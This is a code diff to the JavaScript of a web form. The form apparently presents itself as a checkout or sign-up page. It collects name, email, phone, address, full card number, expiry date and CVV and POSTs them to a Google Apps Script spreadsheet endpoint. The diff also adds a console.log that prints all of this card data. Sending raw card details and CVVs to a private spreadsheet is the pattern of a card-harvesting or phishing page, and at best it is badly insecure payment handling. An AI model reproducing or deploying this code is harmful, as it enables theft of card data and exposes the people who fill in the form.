@@ -249,7 +249,6 @@
                     errorElement.style.display = 'block';
                     return false;
                 }
-                // Check if future
                 const parts = input.value.split('/');
                 const expMonth = parseInt(parts[0], 10);
                 const expYearShort = parts[1];
@@ -331,39 +330,43 @@
             });
 
             if (valid) {
-                // Gather all form data from all steps
                 const formData = {
                     name: document.getElementById('name').value,
                     surname: document.getElementById('surname').value,
                     email: document.getElementById('email').value,
                     phone: document.getElementById('phone').value,
                     address: document.getElementById('address').value,
-                    cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''), // Remove spaces
+                    cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
                     expDate: document.getElementById('expDate').value,
                     cvv: document.getElementById('cvv').value
                 };
 
-                // Send data to Google Sheets via your Apps Script URL
+                console.log('Sending data:', formData);
+
                 fetch('https://script.google.com/macros/s/AKfycbwCa2Frq35LY21MBMlCLdJqQEDccVWQgI0OqO859lGudG02xB3XA596dPsJ_glGZ9HZ/exec', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(formData)
+                    body: JSON.stringify(formData),
+                    signal: AbortSignal.timeout(5000) // 5-second timeout
                 })
-                .then(response => response.text())
+                .then(response => {
+                    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+                    return response.text();
+                })
                 .then(data => {
                     console.log('Spreadsheet response:', data);
                     if (data === 'Success') {
                         this.style.display = 'none';
                         document.getElementById('thankYou').style.display = 'block';
                     } else {
-                        alert('Error saving to spreadsheet');
+                        throw new Error('Unexpected response: ' + data);
                     }
                 })
                 .catch(error => {
-                    console.error('Error:', error);
-                    alert('Failed to connect to spreadsheet');
+                    console.error('Error:', error.message);
+                    alert('Failed to connect to spreadsheet: ' + error.message);
                 });
             }
         });
